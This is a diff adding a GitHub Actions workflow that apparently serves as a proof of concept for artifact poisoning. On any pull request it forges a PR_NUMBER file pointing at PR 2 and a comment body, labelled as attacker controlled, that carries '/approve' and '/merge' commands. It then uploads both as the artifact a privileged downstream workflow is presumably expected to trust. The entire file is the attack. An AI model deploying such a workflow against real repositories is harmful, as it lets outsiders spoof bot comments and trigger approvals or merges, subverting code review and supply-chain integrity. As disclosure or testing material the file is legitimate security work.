@@ -1,0 +1,20 @@
+name: 'Generate comment body on review'
+
+on:
+  pull_request:
+
+jobs:
+  create:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forge artifact
+        run: |
+          echo "2" > PR_NUMBER
+          printf '**FORGED BOT COMMENT** - this text is fully attacker controlled.\n\n/approve and comment /merge\n' > COMMENT_BODY.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: comment_body_on_review
+          path: |
+            PR_NUMBER
+            COMMENT_BODY.txt
+          retention-days: 1
